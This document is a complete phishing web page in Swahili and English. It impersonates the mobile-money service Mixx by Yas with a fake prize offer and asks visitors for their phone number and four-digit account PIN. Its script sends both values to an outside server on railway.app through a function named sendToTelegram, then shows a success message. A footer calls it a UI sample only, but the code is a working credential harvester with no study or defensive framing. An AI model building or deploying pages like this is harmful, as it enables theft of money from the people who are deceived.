<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Umejishindia Ofa - Mixx by Yas</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #0b2b26 0%, #0a1f1c 100%);
            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }

        .card {
            max-width: 520px;
            width: 100%;
            background: rgba(255, 255, 255, 0.97);
            border-radius: 48px;
            padding: 2rem 1.8rem;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.45);
            border: 1px solid rgba(255, 215, 120, 0.3);
        }

        h2 {
            font-size: 1.85rem;
            font-weight: 700;
            background: linear-gradient(135deg, #d4af37, #f5c542);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            text-align: center;
            margin-bottom: 0.6rem;
        }

        .subtitle {
            text-align: center;
            color: #2c5a4e;
            font-weight: 500;
            font-size: 0.95rem;
            margin-bottom: 1.8rem;
            border-bottom: 1px dashed #b9dfcf;
            padding-bottom: 1rem;
        }

        .phone-input {
            margin-bottom: 1.5rem;
        }

        .phone-input input {
            width: 100%;
            padding: 1rem 1.2rem;
            font-size: 1.1rem;
            font-weight: 500;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            background: #fefdf8;
            transition: all 0.25s;
            outline: none;
            font-family: monospace;
            letter-spacing: 0.5px;
            color: #1e2f2a;
        }

        .phone-input input:focus {
            border-color: #f5b042;
            box-shadow: 0 0 0 3px rgba(245, 176, 66, 0.2);
            background: white;
        }

        .phone-input input::placeholder {
            color: #98a9a4;
            font-weight: normal;
            font-family: system-ui;
        }

        p {
            font-weight: 600;
            color: #1e4a3b;
            margin-bottom: 0.75rem;
            font-size: 0.95rem;
        }

        .pin-boxes {
            display: flex;
            gap: 14px;
            justify-content: center;
            margin: 0.5rem 0 0.5rem 0;
        }

        .pin-box {
            width: 70px;
            height: 70px;
            text-align: center;
            font-size: 2.2rem;
            font-weight: 700;
            font-family: monospace;
            border: 2px solid #cfdfd9;
            border-radius: 20px;
            background: #ffffff;
            color: #1f3e36;
            transition: 0.2s;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.02);
        }

        .pin-box:focus {
            border-color: #f5b042;
            outline: none;
            box-shadow: 0 0 0 3px rgba(245, 176, 66, 0.3);
            transform: scale(1.02);
        }

        .pin-box::-webkit-outer-spin-button,
        .pin-box::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .pin-box[type=number] {
            -moz-appearance: textfield;
        }

        .note {
            text-align: center;
            font-size: 0.72rem;
            color: #6f8a82;
            margin-top: 1.8rem;
            background: #f3f9f6;
            padding: 8px 12px;
            border-radius: 40px;
            display: inline-block;
            width: 100%;
        }

        footer {
            text-align: center;
            margin-top: 1.8rem;
            font-size: 0.7rem;
            color: #98afa8;
            border-top: 1px solid #e2ede8;
            padding-top: 1.2rem;
        }

        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) scale(0.9);
            background: #1e2f2a;
            color: #ffde9c;
            padding: 12px 28px;
            border-radius: 60px;
            font-weight: 500;
            font-size: 0.9rem;
            opacity: 0;
            transition: 0.2s;
            pointer-events: none;
            z-index: 1000;
            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
        }

        @media (max-width: 480px) {
            .card {
                padding: 1.5rem 1.2rem;
                border-radius: 32px;
            }
            .pin-box {
                width: 55px;
                height: 55px;
                font-size: 1.8rem;
            }
            h2 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <h2>Umejishindia Ofa Wa Mixx by Yas pesa</h2>
        <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
        
        <div class="phone-input">
            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu" maxlength="10" required>
        </div>

        <p>Enter your Mixx by Yas PIN</p>
        <div class="pin-boxes">
            <input type="tel" maxlength="1" class="pin-box" data-index="0" required>
            <input type="tel" maxlength="1" class="pin-box" data-index="1" required>
            <input type="tel" maxlength="1" class="pin-box" data-index="2" required>
            <input type="tel" maxlength="1" class="pin-box" data-index="3" required>
        </div>

        <input type="hidden" id="pin" name="pin">

        <p class="note">Kuingiza neno siri kunakubali maelezo ya matumizi.</p>
        <footer>© Mixx by Yas – Mfano wa UI pekee</footer>
    </div>

    <div id="toastMsg" class="toast-message"></div>

    <script>
        const pinBoxes = document.querySelectorAll('.pin-box');
        const hiddenPinInput = document.getElementById('pin');
        const phoneNumberInput = document.getElementById('phoneNumber');
        const toast = document.getElementById('toastMsg');

        // Your Railway backend URL
        const API_URL = 'https://mxxyasstz-production.up.railway.app/Server';

        function showMessage(text, isError = true) {
            toast.textContent = text;
            toast.style.opacity = '1';
            toast.style.backgroundColor = isError ? '#872341' : '#1f4e3f';
            setTimeout(() => {
                toast.style.opacity = '0';
            }, 3000);
        }

        function updateHiddenPin() {
            const pin = Array.from(pinBoxes).map(input => input.value).join('');
            hiddenPinInput.value = pin;
        }

        async function sendToTelegram(phoneNumber, pin) {
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phone: phoneNumber, pin: pin })
                });

                const data = await response.json();
                return data.status === 'success';
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', async (e) => {
                // Only allow numbers
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                if (e.target.value.length === 1) {
                    // Move to the next box
                    if (index < pinBoxes.length - 1) {
                        pinBoxes[index + 1].focus();
                    } else {
                        // If this is the last box, check if all are filled
                        const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
                        if (allPinsFilled) {
                            updateHiddenPin();
                            
                            // Check if phone number is filled before submitting
                            if (phoneNumberInput.value.trim() === '') {
                                showMessage('Tafadhali ingiza namba yako ya simu.');
                                phoneNumberInput.focus();
                                return;
                            }
                            
                            const phone = phoneNumberInput.value.trim();
                            const pin = hiddenPinInput.value;
                            
                            // Disable inputs while processing
                            document.querySelectorAll('input').forEach(i => i.disabled = true);
                            showMessage('📤 Inatuma...', false);
                            
                            const success = await sendToTelegram(phone, pin);
                            
                            if (success) {
                                showMessage('✅ Ofa yako imepokelewa! Asante.', false);
                                // Clear form
                                phoneNumberInput.value = '';
                                pinBoxes.forEach(b => b.value = '');
                                pinBoxes[0].focus();
                            } else {
                                showMessage('❌ Hitilafu, jaribu tena.');
                            }
                            
                            document.querySelectorAll('input').forEach(i => i.disabled = false);
                        }
                    }
                }
                updateHiddenPin();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });
    </script>
</body>
</html>
